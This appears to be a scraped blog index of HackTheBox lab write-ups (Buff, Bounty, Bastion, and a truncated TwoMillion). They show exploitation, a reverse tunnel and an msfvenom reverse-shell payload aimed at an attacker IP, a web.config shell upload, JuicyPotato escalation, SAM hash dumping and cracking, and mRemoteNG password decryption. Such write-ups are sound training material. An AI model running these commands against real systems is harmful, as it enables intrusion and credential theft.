Public Exploit, Windows, Chisel", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Buff]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.198[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org )...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Buff]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.198[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 10:01 ISTNmap scan report for 10.10.10.198Host is up (0.13s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION7680/tcp open pando-pub?8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)|_http-title: mrb3n's Bro Hut| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got a simple static page where I found its CMS â†’![Untitled](Buff/Untitled%201.png)Now I searched online and got a public exploit so lets use this exploit :[Gym Management System 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48506)It worked and I got a webshell â†’![Untitled](Buff/Untitled%202.png)Lets have a proper shell through callback .I got the reverse shell through `netcat` call back â†’![Untitled](Buff/Untitled%203.png)I enumerated further for Administrator Privileges as this user does not have a required privileged to Escalate to Administrator user so â†’```bashC:\\xampp\\htdocs\\gym\\upload>whoami /privwhoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ==================================== =SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone DisabledC:\\xampp\\htdocs\\gym\\upload>```{: .nolineno}I got this executable file from downloads directory of `shaun` user with its version as it name â†’```powershellPS C:\\Users\\shaun\\Downloads> dirdir Directory: C:\\Users\\shaun\\DownloadsMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 16/06/2020 16:26 17830824 CloudMe_1112.exe PS C:\\Users\\shaun\\Downloads>```{: .nolineno}and also I checked the other network port connection and found out that 2 other services are accessible internally which are `cloudme` and `mysql` service.```powershellPS C:\\Users\\shaun\\Downloads> netstat -qnetstat -qActive Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 BUFF:0 LISTENING TCP 0.0.0.0:445 BUFF:0 LISTENING TCP 0.0.0.0:5040 BUFF:0 LISTENING TCP 0.0.0.0:7680 BUFF:0 LISTENING TCP 0.0.0.0:8080 BUFF:0 LISTENING TCP 0.0.0.0:49664 BUFF:0 LISTENING TCP 0.0.0.0:49665 BUFF:0 LISTENING TCP 0.0.0.0:49666 BUFF:0 LISTENING TCP 0.0.0.0:49667 BUFF:0 LISTENING TCP 0.0.0.0:49668 BUFF:0 LISTENING TCP 0.0.0.0:49669 BUFF:0 LISTENING TCP 10.10.10.198:139 BUFF:0 LISTENING TCP 10.10.10.198:8080 10.10.16.10:59456 ESTABLISHED TCP 10.10.10.198:49761 10.10.16.10:microsoft-ds ESTABLISHED TCP 127.0.0.1:3306 BUFF:0 LISTENING TCP 127.0.0.1:8888 BUFF:0 LISTENING TCP 0.0.0.0:49761 BUFF:0 BOUND TCP [::]:135 BUFF:0 LISTENING TCP [::]:445 BUFF:0 LISTENING TCP [::]:7680 BUFF:0 LISTENING TCP [::]:8080 BUFF:0 LISTENING TCP [::]:49664 BUFF:0 LISTENING TCP [::]:49665 BUFF:0 LISTENING TCP [::]:49666 BUFF:0 LISTENING TCP [::]:49667 BUFF:0 LISTENING TCP [::]:49668 BUFF:0 LISTENING TCP [::]:49669 BUFF:0 LISTENING UDP 0.0.0.0:123 *:* UDP 0.0.0.0:5050 *:* UDP 0.0.0.0:5353 *:* UDP 0.0.0.0:5355 *:* UDP 0.0.0.0:63104 *:* UDP 10.10.10.198:137 *:* UDP 10.10.10.198:138 *:* UDP 10.10.10.198:1900 *:* UDP 10.10.10.198:56604 *:* UDP 127.0.0.1:1900 *:* UDP 127.0.0.1:56605 *:* UDP 127.0.0.1:59052 *:* UDP [::]:123 *:* UDP [::]:5353 *:* UDP [::]:5355 *:* UDP [::]:63104 *:* UDP [::1]:1900 *:* UDP [::1]:56603 *:* UDP [fe80::3d02:50d:e22b:d235%10]:1900 *:* UDP [fe80::3d02:50d:e22b:d235%10]:56602 *:* PS C:\\Users\\shaun\\Downloads>```{: .nolineno}Now I have to access this service externally so I have to do the port forwarding , therefore I used a tool called chisel that will redirect this port 8888 externally on 127.0.0.1 and I can access it through attacker machine .I downloaded the windows chisel file and transfered it through `curl` command .```powershellPS C:\\Users\\shaun\\Downloads> curl http://10.10.16.10/chisel_1.9.1_windows_amd64 -o chisel_1.9.1_windows_amd64C:\\Users\\shaun\\Downloads>.\\chisel_1.9.1_windows_amd64 client 10.10.16.10:9000 R:8888:10.10.10.198:8888.\\chisel_1.9.1_windows_amd64 client 10.10.16.10:9000 R:8888:10.10.10.198:88882024/01/11 05:44:40 client: Connecting to ws://10.10.16.10:90002024/01/11 05:44:42 client: Connected (Latency 81.2309ms) ```{: .nolineno}I connected the client and server machine through port 9000 and acted attacker machine as a server machine to connect to.```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Buff]â””â”€$ /opt/Tools/chisel server --port 9000 --reverse2024/01/11 11:57:33 server: Reverse tunnelling enabled2024/01/11 11:57:33 server: Fingerprint QI/KbQNfav2HY0UhCHivr7umoRvWOoNh+/423y4+6aM=2024/01/11 11:57:33 server: Listening on http://0.0.0.0:90002024/01/11 11:57:35 server: session#1: Client version (1.9.1) differs from server version (1.7.7)2024/01/11 11:57:35 server: session#1: tun: proxy#R:8888=>10.10.10.198:8888: Listening```{: .nolineno}Now I have the port running so lets check it through `NMAP` Tool.```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Buff]â””â”€$ nmap -p 8888 127.0.0.1 -vv Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 11:17 ISTInitiating Ping Scan at 11:17Scanning 127.0.0.1 [2 ports]Completed Ping Scan at 11:17, 0.00s elapsed (1 total hosts)Initiating Connect Scan at 11:17Scanning localhost (127.0.0.1) [1 port]Discovered open port 8888/tcp on 127.0.0.1Completed Connect Scan at 11:17, 0.00s elapsed (1 total ports)Nmap scan report for localhost (127.0.0.1)Host is up, received syn-ack (0.00041s latency).Scanned at 2024-01-11 11:17:49 IST for 0sPORT STATE SERVICE REASON8888/tcp open sun-answerbook syn-ack```{: .nolineno}Then I searched online related to `cloudme` exploit and through `searchsploit` Tool also I got the hit and I found out an exploit related to buffer overflow so lets use this exploit â†’![Untitled](Buff/Untitled%204.png)I used this exploit in this exploit I have to generate a payload so I used this command instead of given command so make it run â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Buff]â””â”€$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0d\\x0a\" -f python```{: .nolineno}I pasted that payload into the exploit and clarified at last that `payload = buf` and ran the command .![Untitled](Buff/Untitled%205.png)I ran the command and started netcat listener to capture the callback â†’![Untitled](Buff/Untitled%206.png)```powershellC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is A22D-49F7C:.+---3D Objects+---CloudMe+---Contacts+---Desktop| Microsoft Edge.lnk| root.txt| +---Documents| Tasks_real.bat| +---Downloads| CloudMe_1112.exe| +---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---OneDrive+---Pictures| +---Camera Roll| \\---Saved Pictures+---Saved Games+---Searches| winrt--{S-1-5-21-2277156429-3381729605-2640630771-500}-.searchconnector-ms| \\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txt6f7cdc795dc7ad289e516c9288b61fd3C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Bounty", "url": "/posts/Bounty/", "categories": "HackTheBox", "tags": "File Upload, JuicyPotato, PrivEsc, SeImpersonatePrivilege, Windows, config", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bounty]â””â”€$ sudo nmap -sC -sV -p- -T5 -oN Nmap_Result.txt 10.10.10.93[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bounty]â””â”€$ sudo nmap -sC -sV -p- -T5 -oN Nmap_Result.txt 10.10.10.93[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 16:59 ISTStats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 56.40% done; ETC: 17:02 (0:01:20 remaining)Nmap scan report for 10.10.10.93Host is up (0.11s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-title: Bounty|_http-server-header: Microsoft-IIS/7.5Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and I got a simple static site as I knew that this file has a windows server so I searched for asp, aspx, php related files through directory or files bruteforcing â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bounty]â””â”€$ feroxbuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 1 -x asp,aspx ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ðŸ¤“ ver: 2.10.1â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸŽ¯ Target Url â”‚ http://10.10.10.93/ ðŸš€ Threads â”‚ 100 ðŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ðŸ‘Œ Status Codes â”‚ All Status Codes! ðŸ’¥ Timeout (secs) â”‚ 7 ðŸ¦¡ User-Agent â”‚ feroxbuster/2.10.1 ðŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ðŸ”Ž Extract Links â”‚ true ðŸ’¾ Output File â”‚ ferox_80.json ðŸ’² Extensions â”‚ [asp, aspx] ðŸ HTTP methods â”‚ [GET] ðŸ”ƒ Recursion Depth â”‚ 1â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ Press [ENTER] to use the Scan Management Menuâ„¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€404 GET 29l 95w 1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter404 GET 32l 121w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 1624l 16517w 1403476c http://10.10.10.93/merlin.jpg200 GET 32l 53w 630c http://10.10.10.93/200 GET 22l 58w 941c http://10.10.10.93/transfer.aspx301 GET 2l 10w 156c http://10.10.10.93/uploadedFiles => http://10.10.10.93/uploadedFiles/```{: .nolineno}I checked this URL `http://10.10.10.93/transfer.aspx` and got a file upload site so I checked the extensions through burpsuite Intercept and used the seclists wordlist for extension file â†’I also got the URL `http://10.10.10.93/uploadedFiles` for uploadedfiles location that can load that file â†’![Untitled](Bounty/Untitled%201.png)So I can upload config, doc, images files in this site so I searched for reverse shell exploit of config and I got this site â†’[](https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/web.config)Now lets use this file and upload it to site and get the reverse shell , I only have to change the Reverse shell IP and port to get the shell â†’![Untitled](Bounty/Untitled%202.png)while checking privileges I got `SeImpersonatePrivilege` â†’```powershellPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= =SeAssignPrimaryTokenPrivilege Replace a process level token DisabledSeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeAuditPrivilege Generate security audits DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledPS C:\\windows\\system32\\inetsrv>```{: .nolineno}Lets use `JuicyPotato.exe` Tool to Impersonate Privileges to get the `nt\\authority system` .![Untitled](Bounty/Untitled%203.png)Lets see the flag â†’```powershellC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 5084-30B0C:.+---Contacts+---Desktop| root.txt| +---Documents| clean.bat| +---Downloads+---Favorites| +---Links| | Suggested Sites.url| | Web Slice Gallery.url| | | +---Microsoft Websites| | IE Add-on site.url| | IE site on Microsoft.com.url| | Microsoft At Home.url| | Microsoft At Work.url| | Microsoft Store.url| | | +---MSN Websites| | MSN Autos.url| | MSN Entertainment.url| | MSN Money.url| | MSN Sports.url| | MSN.url| | MSNBC News.url| | | \\---Windows Live| Get Windows Live.url| Windows Live Gallery.url| Windows Live Mail.url| Windows Live Spaces.url| +---Links| Desktop.lnk| Downloads.lnk| RecentPlaces.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>cd Desktopcd DesktopC:\\Users\\Administrator\\Desktop>type root.txttype root.txtde88bf743cf4f5dbb9e8e7a523a47552C:\\Users\\Administrator\\Desktop>```{: .nolineno}I am Administrator Now â†’> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Bastion", "url": "/posts/Bastion/", "categories": "HackTheBox", "tags": "Password Cracking, PrivEsc, SMB, Windows, guestmount, mRemoteNG, mount", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Result â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ nmap -sC -sV -p- -T5 -oN Nmap_Result.txt 10.10.10.134Warning: 10.10.10.134 giving up on port because retransmission cap hit ...", "content": "## Port Scan Result â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ nmap -sC -sV -p- -T5 -oN Nmap_Result.txt 10.10.10.134Warning: 10.10.10.134 giving up on port because retransmission cap hit (2).Nmap scan report for 10.10.10.134Host is up (0.23s latency).Not shown: 65515 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found33749/tcp filtered unknown47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC50078/tcp filtered unknown50439/tcp filtered unknown50495/tcp filtered unknown55954/tcp filtered unknown58225/tcp filtered unknown65244/tcp filtered unknownService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Bastion| NetBIOS computer name: BASTION\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2024-01-05T09:31:17+01:00| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_clock-skew: mean: -19m52s, deviation: 34m37s, median: 5s| smb2-time: | date: 2024-01-05T08:31:18|_ start_date: 2024-01-04T09:35:25```{: .nolineno}## SMB Enumeration â¤µï¸I got the port 445 open and I checked it with `crackmapexec Tool` and I got these shares â†’![Untitled](Bastion/Untitled%201.png)As I got `Backups` Directory as read access so lets enumerate further more and try to access that share through mounting it on system â†’![Untitled](Bastion/Untitled%202.png)I have this share mounted lets see the file with its size â†’![Untitled](Bastion/Untitled%203.png)I have 2 file `virtual hard disk(VHD)` files so lets use a virtual machine to access those VHD files â†’Iâ€™m going to mount the virtual disk files and see what I can find in them. First, Iâ€™ll installÂ `guestmount`Â withÂ `apt install libguestfs-tools`, aÂ [tool for mounting virtual hard disk files](https://linux.die.net/man/1/guestmount)Â on Linux.I used the first `vhd` file and it failed to execute :```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ sudo guestmount --add ~/Downloads/HTB/Bastion/shares/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /tmp/vhd1 guestmount: no operating system was found on this diskIf using guestfish â€˜-iâ€™ option, remove this option and insteaduse the commands â€˜runâ€™ followed by â€˜list-filesystemsâ€™.You can then mount filesystems you want by hand using theâ€˜mountâ€™ or â€˜mount-roâ€™ command.If using guestmount â€˜-iâ€™, remove this option and choose thefilesystem(s) you want to see by manually adding â€˜-mâ€™ option(s).Use â€˜virt-filesystemsâ€™ to see what filesystems are available.If using other virt tools, this disk image wonâ€™t workwith these tools. Use the guestfish equivalent commands(see the virt tool manual page).```{: .nolineno}Now the second file :```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion/shares]â””â”€$ sudo guestmount --add ~/Downloads/HTB/Bastion/shares/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/```{: .nolineno}Now lets access that share `/mnt/` with `sudo` permissions â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion/shares]â””â”€$ sudo ls -al /mnt/total 2096745drwxrwxrwx 1 root root 12288 Feb 22 2019 .drwxr-xr-x 18 root root 4096 Oct 31 00:27 ..drwxrwxrwx 1 root root 0 Feb 22 2019 '$Recycle.Bin'-rwxrwxrwx 1 root root 24 Jun 11 2009 autoexec.bat-rwxrwxrwx 1 root root 10 Jun 11 2009 config.syslrwxrwxrwx 2 root root 14 Jul 14 2009 'Documents and Settings' -> /sysroot/Users-rwxrwxrwx 1 root root 2147016704 Feb 22 2019 pagefile.sysdrwxrwxrwx 1 root root 0 Jul 14 2009 PerfLogsdrwxrwxrwx 1 root root 4096 Jul 14 2009 ProgramDatadrwxrwxrwx 1 root root 4096 Apr 12 2011 'Program Files'drwxrwxrwx 1 root root 0 Feb 22 2019 Recoverydrwxrwxrwx 1 root root 4096 Feb 22 2019 'System Volume Information'drwxrwxrwx 1 root root 4096 Feb 22 2019 Usersdrwxrwxrwx 1 root root 16384 Feb 22 2019 Windows```{: .nolineno}Since I got the directory access so lets access the SAM value or hashdump for Users â†’```bashâ”Œâ”€â”€(rootã‰¿kali)-[/mnt/Windows/System32/config]â””â”€# samdump2 SYSTEM SAM*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::```{: .nolineno}with `samdump2 Tool` and arguments as `SAM` and `SYSTEM` I can access the NTLM hash of the users , Now lets crack that hash to get access â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==============================================================* Device #1: cpu-penryn-Intel(R) Core(TM) i5-8300H CPU @ 2.30GHz, 2913/5891 MB (1024 MB allocatable), 2MCU......26112010952d963c8dc4217daec986d9:bureaulampje Session..........: hashcatStatus...........: CrackedHash.Mode........: 1000 (NTLM)Hash.Target......: hashes.txtTime.Started.....: Wed Jan 10 23:03:03 2024 (9 secs)Time.Estimated...: Wed Jan 10 23:03:12 2024 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 699.2 kH/s (0.37ms) @ Accel:512 Loops:1 Thr:1 Vec:4Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)Progress.........: 9396224/14344385 (65.50%)Rejected.........: 0/9396224 (0.00%)Restore.Point....: 9395200/14344385 (65.50%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: burgers11 -> burbank105Hardware.Mon.#1..: Util: 47%```{: .nolineno}```{: .nolineno}L4mpje:bureaulampje```{: .nolineno}Lets access the `ssh` shell â†’## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ ssh L4mpje@10.10.10.134 The authenticity of host '10.10.10.134 (10.10.10.134)' can not be established.ED25519 key fingerprint is SHA256:2ZbIDKRPlngECX1WSMqnucdOWthIaPG7wQ6mBReac7M.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.10.134' (ED25519) to the list of known hosts.L4mpje@10.10.10.134 is password:Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. l4mpje@BASTION C:\\Users\\L4mpje>whoami bastion\\l4mpje l4mpje@BASTION C:\\Users\\L4mpje>hostname Bastion l4mpje@BASTION C:\\Users\\L4mpje>whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled l4mpje@BASTION C:\\Users\\L4mpje>```{: .nolineno}I noticed this `confCons.xml` file from this directory after so much recon `C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG` â†’```bashl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG>dir Volume in drive C has no label. Volume Serial Number is 1B7D-E692 Directory of C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG 22-02-2019 14:03 . 22-02-2019 14:03 .. 22-02-2019 14:03 6.316 confCons.xml 22-02-2019 14:02 6.194 confCons.xml.20190222-1402277353.backup 22-02-2019 14:02 6.206 confCons.xml.20190222-1402339071.backup 22-02-2019 14:02 6.218 confCons.xml.20190222-1402379227.backup 22-02-2019 14:02 6.231 confCons.xml.20190222-1403070644.backup 22-02-2019 14:03 6.319 confCons.xml.20190222-1403100488.backup 22-02-2019 14:03 6.318 confCons.xml.20190222-1403220026.backup 22-02-2019 14:03 6.315 confCons.xml.20190222-1403261268.backup 22-02-2019 14:03 6.316 confCons.xml.20190222-1403272831.backup 22-02-2019 14:03 6.315 confCons.xml.20190222-1403433299.backup 22-02-2019 14:03 6.316 confCons.xml.20190222-1403486580.backup 22-02-2019 14:03 51 extApps.xml 22-02-2019 14:03 5.217 mRemoteNG.log 22-02-2019 14:03 2.245 pnlLayout.xml 22-02-2019 14:01 Themes 14 File(s) 76.577 bytes 3 Dir(s) 4.824.412.160 bytes free l4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG> ```{: .nolineno}```bashUsername=\"Administrator\" Domain=\"\" Password=\"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==\"Username=\"L4mpje\" Domain=\"\" Password=\"yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB\"```{: .nolineno}[mRemoting_decrypter/mRemoteNG_decrypter.py Â· master Â· 0xdf / CTFScripts Â· GitLab](https://gitlab.com/0xdf/ctfscripts/-/blob/master/mRemoting_decrypter/mRemoteNG_decrypter.py?ref_type=heads)I used this exploit to decode this password â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ python3 mRemoteNG_pass_decrypt.py data.xml [+] Found nodes: 2Username: AdministratorPassword: thXLHM96BeKL0ER2Username: L4mpjePassword: bureaulampje```{: .nolineno}I then logged into administrator account and got flag â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Bastion]â””â”€$ ssh administrator@10.10.10.134administrator@10.10.10.134s password: Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. administrator@BASTION C:\\Users\\Administrator>administrator@BASTION C:\\Users\\Administrator>whoami bastion\\administrator administrator@BASTION C:\\Users\\Administrator>hostname Bastion administrator@BASTION C:\\Users\\Administrator>dir Volume in drive C has no label. Volume Serial Number is 1B7D-E692 Directory of C:\\Users\\Administrator 25-04-2019 05:08 . 25-04-2019 05:08 .. 23-02-2019 09:40 Contacts 23-02-2019 09:40 Desktop 23-02-2019 09:40 Documents 23-02-2019 09:40 Downloads 23-02-2019 09:40 Favorites 23-02-2019 09:40 Links 23-02-2019 09:40 Music 23-02-2019 09:40 Pictures 23-02-2019 09:40 Saved Games 23-02-2019 09:40 Searches 23-02-2019 09:40 Videos 0 File(s) 0 bytes 13 Dir(s) 4.824.166.400 bytes free administrator@BASTION C:\\Users\\Administrator>tree /f /a Folder PATH listing Volume serial number is 0000006D 1B7D:E692 C:. +---Contacts +---Desktop | root.txt | +---Documents | \\---WindowsPowerShell | \\---Scripts | \\---InstalledScriptInfos +---Downloads | OpenSSH-Win64.zip | +---Favorites | | Bing.url | | | \\---Links +---Links | Desktop.lnk | Downloads.lnk | +---Music +---Pictures +---Saved Games +---Searches \\---Videos administrator@BASTION C:\\Users\\Administrator>type Desktop\\root.txt 1baa4244ed4bc4b7d161109fedede1c2 administrator@BASTION C:\\Users\\Administrator>```{: .nolineno}I am administrator now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "TwoMillion", "url": "/posts/TwoMillion/", "categories": "HackTheBox", "tags": "Command Injection, Public Exploit, Obfuscation, PrivEsc", "date": "2023-12-10 00:00:00 +0530", "snippet": "> HackTheBox Easy Machine [TwoMillion](https://app.hackthebox.com/machines/TwoMillion){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/TwoMillion]â””â”€$ nmap -sC -sV -p- -...", "content": "> HackTheBox Easy Machine [TwoMillion](https://app.hackthebox.com/machines/TwoMillion){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/TwoMillion]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.221Warning: 10.10.11.221 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.11.221Host is up (0.17s latency).Not shown: 65509 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx|_http-title: Did not follow redirect to http://2million.htb/3994/tcp filtered unknown7316/tcp filtered swx7546/tcp filtered cfs7659/tcp filtered unknown17495/tcp filtered unknown18374/tcp filtered unknown21128/tcp filtered unknown22425/tcp filtered unknown25486/tcp filtered unknown27136/tcp filtered unknown28073/tcp filtered unknown30826/tcp filtered unknown31592/tcp filtered unknown32621/tcp filtered unknown34500/tcp filtered 